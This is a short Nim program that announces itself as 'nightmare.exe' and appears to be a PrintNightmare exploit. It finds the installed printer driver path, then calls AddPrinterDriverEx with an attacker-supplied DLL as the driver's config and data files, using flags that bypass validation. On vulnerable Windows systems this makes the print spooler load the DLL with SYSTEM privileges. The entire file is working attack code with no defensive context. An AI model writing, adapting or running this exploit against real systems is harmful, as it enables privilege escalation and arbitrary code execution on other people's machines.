import winim
import strformat
import os
import bitops

if paramCount() != 1:
    echo "usage: nightmare.exe <C:\\ABSPATH\\TO\\DLL>"

var
    dll_path = paramStr(1)
    info: DRIVER_INFO_2
    pcbNeeded: DWORD
    numDriversExist: DWORD

# get required bytes for driver info in pcbNeeded
EnumPrinterDrivers(NULL, "Windows x64", 2, NULL, 0, `&`pcbNeeded, `&`numDriversExist)

# allocate buffer for driver info
var pDriverInfo = create(BYTE, pcbNeeded)

# save driver info into pDriverInfo
let status = EnumPrinterDrivers(NULL, "Windows x64", 2, pDriverInfo, pcbNeeded, `&`pcbNeeded, `&`numDriversExist)

if status != 1:
    echo "[!] Could not find current printer drivers"
    quit(1)

var driverInfo = cast[ptr DRIVER_INFO_2](pDriverInfo)

echo fmt"[*] using DriverPath: {driverInfo.pDriverPath}"

info.cVersion = 3
info.pConfigFile = dll_path
info.pDataFile = dll_path
# for winsrv2008 the driverpath is C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_neutral_4616c3de1949be6d\\Amd64\\UNIDRV.DLL
info.pDriverPath = driverInfo.pDriverPath
info.pEnvironment = "Windows x64"
info.pName = T"NimDriver"

echo "[*] Load DLL to driver path..."
let success = AddPrinterDriverEx(NULL, 2, cast[PBYTE](`&`info), bitor(APD_COPY_ALL_FILES, 0x10, 0x8000))

if success == ERROR_PRINTER_DRIVER_BLOCKED:
    echo ":/"
else:
    echo ":)"